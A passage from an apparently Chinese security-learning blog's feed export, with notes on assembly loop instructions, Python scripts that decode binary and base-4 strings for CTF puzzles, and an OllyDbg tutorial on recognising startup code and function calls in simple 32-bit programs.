<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205931779.png" alt="image-20220127205931779" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205948743.png" alt="image-20220127205948743" /></p>
<p>将 dec 改为 inc，并将 eax 赋值为 0 进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127210233083.png" alt="image-20220127210233083" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127210250862.png" alt="image-20220127210250862" /></p>
<p>实现跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127210309969.png" alt="image-20220127210309969" /></p>
<h3 id="loope与loopne指令学习"><a class="anchor" href="#loope与loopne指令学习">#</a> loope 与 loopne 指令学习</h3>
<p>loope 与 loopz 不同的是，loope 以 cmp 为跳转条件，而 loopz 以加减法为跳转条件</p>
<p>即 loope 是以其操作数的比较值作为跳转条件的，若操作数相等，其结果为 0 进行跳转</p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>进制解码</title>
    <url>/article/66f43719.html</url>
    <content><![CDATA[<h1 id="二进制解码"><a class="anchor" href="#二进制解码">#</a> 二进制解码</h1>
<h2 id="二进制幂数解码"><a class="anchor" href="#二进制幂数解码">#</a> 二进制幂数解码</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>a<span class="token operator">=</span><span class="token string">"8842101220480224404014224202480122"</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#分隔</span></pre></td></tr><tr><td data-num="3"></td><td><pre>a<span class="token operator">=</span>a<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>flag<span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#遍历</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">list</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token builtin">sum</span><span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token builtin">sum</span> <span class="token operator">+=</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    flag <span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">65</span> <span class="token operator">+</span> <span class="token builtin">sum</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="二进制转十进制"><a class="anchor" href="#二进制转十进制">#</a> 二进制转十进制</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ciphertxt <span class="token operator">=</span><span class="token string">"01000100010100110111100100110011010010100111100101001011011101100101000001000011010100000110110101001000001101000101011101000011011110100010101101010100011010000101011101101001001100100100011001100111010010110110111100111001011001010101001101010000010101010011010001100101001101010110011100101011011010100101101001010101001100110100011001110010010101110100111001110110010011000100110100110101001101010110101101000101011001100011000101101000010001010110110101001110011100100111010100101011010011100100010100110011"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>m <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ciphertxt<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>ciphertxt<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="四进制解码"><a class="anchor" href="#四进制解码">#</a> 四进制解码</h1>
<h2 id="密文直输版"><a class="anchor" href="#密文直输版">#</a> 密文直输版</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ciphertxt <span class="token operator">=</span> <span class="token string">'1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>c <span class="token operator">=</span> ciphertxt<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    temp <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        temp <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">**</span>j<span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token operator">-</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="txt版"><a class="anchor" href="#txt版">#</a> txt 版</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>m <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    text <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    c <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        temp <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            temp <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">**</span>j<span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token operator">-</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        m <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之32位函数识别</title>
    <url>/article/241412fc.html</url>
    <content><![CDATA[<h2 id="启动函数"><a class="anchor" href="#启动函数">#</a> 启动函数</h2>
<p>样例源代码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>LRESULT CALLBACK <span class="token function">WndProc</span> <span class="token punctuation">(</span>HWND<span class="token punctuation">,</span> UINT<span class="token punctuation">,</span> WPARAM<span class="token punctuation">,</span> LPARAM<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">int</span> WINAPI <span class="token function">WinMain</span> <span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>                    PSTR szCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> iCmdShow<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#123;</span><span class="token comment">// 注册窗口类</span></pre></td></tr><tr><td data-num="8"></td><td><pre>     <span class="token keyword">static</span> TCHAR szAppName<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">TEXT</span> <span class="token punctuation">(</span><span class="token string">"chap231"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>     HWND         hwnd <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>     MSG          msg <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>     WNDCLASS     wndclass <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>     wndclass<span class="token punctuation">.</span>style         <span class="token operator">=</span> CS_HREDRAW <span class="token operator">|</span> CS_VREDRAW <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>     wndclass<span class="token punctuation">.</span>lpfnWndProc   <span class="token operator">=</span> WndProc <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>     wndclass<span class="token punctuation">.</span>cbClsExtra    <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>     wndclass<span class="token punctuation">.</span>cbWndExtra    <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>     wndclass<span class="token punctuation">.</span>hInstance     <span class="token operator">=</span> hInstance <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>     wndclass<span class="token punctuation">.</span>hIcon         <span class="token operator">=</span> <span class="token function">LoadIcon</span> <span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> IDI_APPLICATION<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>     wndclass<span class="token punctuation">.</span>hCursor       <span class="token operator">=</span> <span class="token function">LoadCursor</span> <span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> IDC_ARROW<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>     wndclass<span class="token punctuation">.</span>hbrBackground <span class="token operator">=</span> <span class="token punctuation">(</span>HBRUSH<span class="token punctuation">)</span> <span class="token function">GetStockObject</span> <span class="token punctuation">(</span>WHITE_BRUSH<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>     wndclass<span class="token punctuation">.</span>lpszMenuName  <span class="token operator">=</span> <span class="token constant">NULL</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>     wndclass<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> szAppName <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">RegisterClass</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>wndclass<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>          <span class="token keyword">return</span> <span class="token number">0</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        </pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token comment">// 创建 window</span></pre></td></tr><tr><td data-num="28"></td><td><pre>     hwnd <span class="token operator">=</span> <span class="token function">CreateWindow</span> <span class="token punctuation">(</span>szAppName<span class="token punctuation">,</span>                  </pre></td></tr><tr><td data-num="29"></td><td><pre>                          <span class="token function">TEXT</span> <span class="token punctuation">(</span><span class="token string">"静态分析技术实例"</span><span class="token punctuation">)</span> <span class="token punctuation">,</span>  </pre></td></tr><tr><td data-num="30"></td><td><pre>                          WS_OVERLAPPEDWINDOW<span class="token punctuation">,</span>         </pre></td></tr><tr><td data-num="31"></td><td><pre>                          CW_USEDEFAULT<span class="token punctuation">,</span>               </pre></td></tr><tr><td data-num="32"></td><td><pre>                          CW_USEDEFAULT<span class="token punctuation">,</span>               </pre></td></tr><tr><td data-num="33"></td><td><pre>                          CW_USEDEFAULT<span class="token punctuation">,</span>               </pre></td></tr><tr><td data-num="34"></td><td><pre>                          CW_USEDEFAULT<span class="token punctuation">,</span>               </pre></td></tr><tr><td data-num="35"></td><td><pre>                          <span class="token constant">NULL</span><span class="token punctuation">,</span>                       </pre></td></tr><tr><td data-num="36"></td><td><pre>                          <span class="token constant">NULL</span><span class="token punctuation">,</span>                       </pre></td></tr><tr><td data-num="37"></td><td><pre>                          hInstance<span class="token punctuation">,</span>                  </pre></td></tr><tr><td data-num="38"></td><td><pre>                          <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>                      </pre></td></tr><tr><td data-num="39"></td><td><pre>     </pre></td></tr><tr><td data-num="40"></td><td><pre>     <span class="token function">ShowWindow</span> <span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span> iCmdShow<span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">// 显示窗口</span></pre></td></tr><tr><td data-num="41"></td><td><pre>     <span class="token function">UpdateWindow</span> <span class="token punctuation">(</span>hwnd<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>     </pre></td></tr><tr><td data-num="43"></td><td><pre>     <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">GetMessage</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>     <span class="token punctuation">&#123;</span><span class="token comment">// 消息循环，接收处理消息</span></pre></td></tr><tr><td data-num="45"></td><td><pre>          <span class="token function">TranslateMessage</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>          <span class="token function">DispatchMessage</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>     <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>     <span class="token keyword">return</span> msg<span class="token punctuation">.</span>wParam <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre>LRESULT CALLBACK <span class="token function">WndProc</span> <span class="token punctuation">(</span>HWND hwnd<span class="token punctuation">,</span> UINT message<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token punctuation">&#123;</span><span class="token comment">// 消息响应</span></pre></td></tr><tr><td data-num="53"></td><td><pre>	 <span class="token keyword">int</span> input<span class="token punctuation">;</span>    </pre></td></tr><tr><td data-num="54"></td><td><pre>     <span class="token keyword">switch</span> <span class="token punctuation">(</span>message<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>     <span class="token punctuation">&#123;</span>         </pre></td></tr><tr><td data-num="56"></td><td><pre>	<span class="token keyword">case</span> WM_DESTROY<span class="token operator">:</span></pre></td></tr><tr><td data-num="57"></td><td><pre>          <span class="token function">PostQuitMessage</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>          <span class="token keyword">return</span> <span class="token number">0</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token keyword">case</span> WM_CLOSE<span class="token operator">:</span></pre></td></tr><tr><td data-num="61"></td><td><pre>		input<span class="token operator">=</span><span class="token function">MessageBox</span><span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span><span class="token function">TEXT</span> <span class="token punctuation">(</span><span class="token string">"你真的决定退出吗?"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">TEXT</span> <span class="token punctuation">(</span><span class="token string">"退出"</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="62"></td><td><pre>						 MB_YESNO<span class="token operator">|</span>MB_ICONQUESTION<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>		<span class="token keyword">switch</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>			<span class="token keyword">case</span> IDYES<span class="token operator">:</span></pre></td></tr><tr><td data-num="66"></td><td><pre>				<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>			<span class="token keyword">case</span> IDNO<span class="token operator">:</span></pre></td></tr><tr><td data-num="68"></td><td><pre>				<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>     <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>     <span class="token keyword">return</span> <span class="token function">DefWindowProc</span> <span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span> message<span class="token punctuation">,</span> wParam<span class="token punctuation">,</span> lParam<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>OD 打开应用程序，直接进入如下页面</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220326200117511.png" alt="image-20220326200117511" /></p>
<p>也就是说在 Windows 窗口程序中，它并不是直接停在 Winmian 函数上，而是停在系统的提供函数上，从而进行一些资源的预分配等。</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 确定系统版本</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">004011</span>A6  <span class="token operator">|</span><span class="token punctuation">.</span>  FF15 <span class="token number">40404000</span> CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>KERNEL32<span class="token punctuation">.</span>GetVersion<span class="token operator">></span><span class="token punctuation">;</span>  KERNEL32<span class="token punctuation">.</span>GetVersion</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 指向进程的完整命令行指针</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">004011F</span><span class="token number">4</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  FF15 <span class="token number">3</span>C404000 CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>KERNEL32<span class="token punctuation">.</span>GetCommand<span class="token operator">></span><span class="token punctuation">;</span> <span class="token punctuation">[</span>GetCommandLineA</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">// 获取进程的启动信息</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0040121</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX                                 <span class="token punctuation">;</span> <span class="token operator">/</span>pStartupinfo</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0040121F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  FF15 <span class="token number">38404000</span> CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>KERNEL32<span class="token punctuation">.</span>GetStartup<span class="token operator">></span><span class="token punctuation">;</span> \GetStartupInfoA</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">// 返回地址空间执行文件的基地址，以参数形式放在此处</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00401241</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">56</span>            PUSH ESI                                 <span class="token punctuation">;</span> <span class="token operator">|</span><span class="token operator">/</span>pModule</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00401242</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  FF15 <span class="token number">34404000</span> CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>KERNEL32<span class="token punctuation">.</span>GetModuleH<span class="token operator">></span><span class="token punctuation">;</span> <span class="token operator">|</span>\GetModuleHandleA</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">// 主函数入口 winmain</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">00401249</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 B2FDFFFF   CALL ReverseM<span class="token punctuation">.</span><span class="token number">00401000</span>                   <span class="token punctuation">;</span> \ReverseM<span class="token punctuation">.</span><span class="token number">00401000</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">// 退出函数 exit 或者 ExitProcess</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">00401252</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">95000000</span>   CALL ReverseM<span class="token punctuation">.</span><span class="token number">004012</span>EC</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220326201921761.png" alt="image-20220326201921761" /></p>
<p>分析函数时也即在 winmain 函数处进行断点，然后 f9 执行到断点处</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220326202110521.png" alt="image-20220326202110521" /></p>
<p>f8：单步步过，f7：单步步入</p>
<h2 id="函数的识别"><a class="anchor" href="#函数的识别">#</a> 函数的识别</h2>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">main</span><span class="token punctuation">(</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	 	<span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">;</span><span class="token comment">// 实参</span></pre></td></tr><tr><td data-num="5"></td><td><pre>		<span class="token function">Add</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	 	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token comment">// 形参</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token keyword">return</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="动态分析"><a class="anchor" href="#动态分析">#</a> 动态分析</h3>
<p>在反汇编中识别函数代码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327170147621.png" alt="image-20220327170147621" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">004010</span>CF  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">2</span>CFFFFFF   CALL add<span class="token punctuation">.</span><span class="token number">00401000</span>                        <span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="2"></td><td><pre>如果是控制台就是三个参数，main 如果是win32窗口，就是四个参数，winmain</pre></td></tr></table></figure><p>f2 断点，f9 执行到这然后 f7 进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327170302868.png" alt="image-20220327170302868" /></p>
<p>函数分析如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327170535360.png" alt="image-20220327170535360" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">6</span>A <span class="token number">06</span>         PUSH <span class="token number">6</span>                                   <span class="token punctuation">;</span>  参数<span class="token number">2</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401002</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">6</span>A <span class="token number">05</span>         PUSH <span class="token number">5</span>                                   <span class="token punctuation">;</span>  参数<span class="token number">1</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401004</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">07000000</span>   CALL add<span class="token punctuation">.</span><span class="token number">00401010</span>                        <span class="token punctuation">;</span>  调用的函数 call <span class="token operator">=</span> push eip jmp <span class="token number">00401010</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401009</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">8</span>                                <span class="token punctuation">;</span>  平栈，保持堆栈平衡</pre></td></tr><tr><td 